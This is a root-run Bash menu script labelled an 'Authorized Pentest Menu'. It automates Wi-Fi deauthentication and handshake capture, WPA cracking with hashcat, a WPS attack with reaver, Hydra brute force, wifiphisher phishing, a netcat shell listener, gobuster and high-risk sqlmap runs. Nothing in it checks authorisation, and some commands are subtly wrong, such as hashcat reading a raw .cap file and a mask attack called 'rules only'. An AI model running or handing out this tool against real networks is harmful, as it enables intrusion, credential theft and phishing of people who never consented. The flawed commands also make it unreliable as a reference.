#!/bin/bash

# Auto-detect wireless interface
IFACE=$(iw dev | awk '$1=="Interface"{print $2; exit}')
MON_IFACE="${IFACE}mon"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

clear
echo -e "${BLUE}=== Authorized Pentest Menu ===${NC}"
echo "Interface: ${YELLOW}$IFACE${NC} -> Monitor: ${YELLOW}$MON_IFACE${NC}"
echo

show_menu() {
    echo "1)  Start monitor mode (airmon-ng)"
    echo "2)  Stop monitor mode (airmon-ng)"
    echo "3)  Scan networks (airodump-ng)"
    echo "4)  Capture handshake (aireplay-ng + airodump-ng)"
    echo "5)  Install wireless tools"
    echo "6)  Crack handshake (rockyou.txt)"
    echo "7)  Crack handshake (custom wordlist)"
    echo "8)  Crack handshake (no wordlist - hashcat rules)"
    echo "9)  Create wordlist (crunch)"
    echo "10) Perform WPS attack (reaver)"
    echo "11) Scan network with Nmap"
    echo "12) Run Metasploit exploit"
    echo "13) Brute-force login with Hydra"
    echo "14) Perform phishing attack (wifiphisher)"
    echo "15) Scan web server with Nikto"
    echo "16) Listen with Netcat"
    echo "17) Brute-force directories (gobuster)"
    echo "18) SQL Injection (sqlmap)"
    echo "0)  Exit"
    echo
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Run as root: sudo $0${NC}"
        exit 1
    fi
}

install_tools() {
    echo -e "${YELLOW}Installing wireless tools...${NC}"
    apt update
    apt install -y aircrack-ng hashcat hcxtools rockyou.txt.gz wifite reaver bully crunch hydra nmap metasploit-framework wifiphisher nikto netcat-traditional gobuster sqlmap wordlists
    gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
    echo -e "${GREEN}Tools installed!${NC}"
}

case_selection() {
    read -p "Select option: " choice
    
    case $choice in
        1)
            echo -e "${YELLOW}Starting monitor mode on $IFACE...${NC}"
            airmon-ng check kill
            airmon-ng start $IFACE
            echo -e "${GREEN}Monitor interface: $MON_IFACE${NC}"
            ;;
        2)
            echo -e "${YELLOW}Stopping monitor mode...${NC}"
            airmon-ng stop $MON_IFACE 2>/dev/null || true
            airmon-ng stop ${IFACE}mon 2>/dev/null || true
            service NetworkManager restart
            echo -e "${GREEN}Monitor mode stopped${NC}"
            ;;
        3)
            echo -e "${YELLOW}Scanning networks (Ctrl+C to stop)...${NC}"
            airodump-ng $MON_IFACE
            ;;
        4)
            read -p "Enter BSSID (AA:BB:CC:DD:EE:FF): " bssid
            read -p "Enter channel: " channel
            echo -e "${YELLOW}Capturing handshake on $bssid (channel $channel)...${NC}"
            airodump-ng -c $channel --bssid $bssid -w capture $MON_IFACE &
            AIRODUMP_PID=$!
            sleep 10
            aireplay-ng -0 10 -a $bssid $MON_IFACE
            wait $AIRODUMP_PID
            echo -e "${GREEN}Handshake saved: capture-01.cap${NC}"
            ;;
        5)
            install_tools
            ;;
        6)
            if [[ ! -f "capture-01.cap" ]]; then
                echo -e "${RED}No capture-01.cap found. Run option 4 first.${NC}"
                return
            fi
            echo -e "${YELLOW}Cracking with rockyou.txt...${NC}"
            hashcat -m 22000 capture-01.cap /usr/share/wordlists/rockyou.txt --force
            ;;
        7)
            read -p "Enter custom wordlist path: " wordlist
            if [[ ! -f "capture-01.cap" || ! -f "$wordlist" ]]; then
                echo -e "${RED}capture-01.cap or wordlist not found.${NC}"
                return
            fi
            echo -e "${YELLOW}Cracking with custom wordlist...${NC}"
            hashcat -m 22000 capture-01.cap "$wordlist" --force
            ;;
        8)
            if [[ ! -f "capture-01.cap" ]]; then
                echo -e "${RED}No capture-01.cap found.${NC}"
                return
            fi
            echo -e "${YELLOW}Cracking without wordlist (rules only)...${NC}"
            hashcat -m 22000 capture-01.cap -a 3 ?d?d?d?d?d?d?d?d --increment --increment-min=8 --force
            ;;
        9)
            read -p "Pattern (ex: wifi123): " pattern
            read -p "Min length: " min
            read -p "Max length: " max
            read -p "Output file: " output
            echo -e "${YELLOW}Generating wordlist...${NC}"
            crunch $min $max "$pattern" -o "$output"
            ;;
        10)
            read -p "Enter BSSID: " bssid
            echo -e "${YELLOW}WPS attack on $bssid...${NC}"
            reaver -i $MON_IFACE -b $bssid -vv
            ;;
        11)
            read -p "Target IP/Range: " target
            echo -e "${YELLOW}Nmap scan on $target...${NC}"
            nmap -sC -sV -A -T4 $target
            ;;
        12)
            read -p "Exploit name/path (ex: exploit/multi/handler): " exploit
            echo -e "${YELLOW}Starting Metasploit...${NC}"
            msfconsole -q -x "use $exploit; show options; exploit"
            ;;
        13)
            read -p "Target (IP:PORT): " target
            read -p "Service (http-post-form,ssh,ftp): " service
            read -p "Path/User/Pass params: " params
            read -p "Wordlist: " wordlist
            echo -e "${YELLOW}Hydra brute-force on $target...${NC}"
            hydra -L /usr/share/wordlists/rockyou.txt -P "$wordlist" $target $service "$params"
            ;;
        14)
            echo -e "${YELLOW}Starting Wifiphisher...${NC}"
            wifiphisher
            ;;
        15)
            read -p "Target URL/IP: " target
            echo -e "${YELLOW}Nikto web scan...${NC}"
            nikto -h $target
            ;;
        16)
            read -p "Port to listen (ex: 4444): " port
            echo -e "${YELLOW}Netcat listener on port $port...${NC}"
            nc -lvnp $port
            ;;
        17)
            read -p "Target URL/IP: " target
            read -p "Wordlist (default DIRB): " wordlist
            wordlist=${wordlist:-/usr/share/wordlists/dirb/common.txt}
            echo -e "${YELLOW}Gobuster directory brute-force...${NC}"
            gobuster dir -u http://$target -w $wordlist -t 50
            ;;
        18)
            read -p "Target URL: " target
            echo -e "${YELLOW}SQLMap injection test...${NC}"
            sqlmap -u "$target" --batch --risk=3 --level=5
            ;;
        0)
            echo -e "${GREEN}Cleaning up...${NC}"
            airmon-ng stop $MON_IFACE 2>/dev/null || true
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
    echo
    read -p "Press Enter to continue..."
}

# Main loop
check_root
install_tools  # Auto-install on first run

while true; do
    clear
    echo -e "${BLUE}=== Authorized Pentest Menu ===${NC}"
    echo "Interface: ${YELLOW}$IFACE${NC} -> Monitor: ${YELLOW}$MON_IFACE${NC}"
    show_menu
    case_selection
done

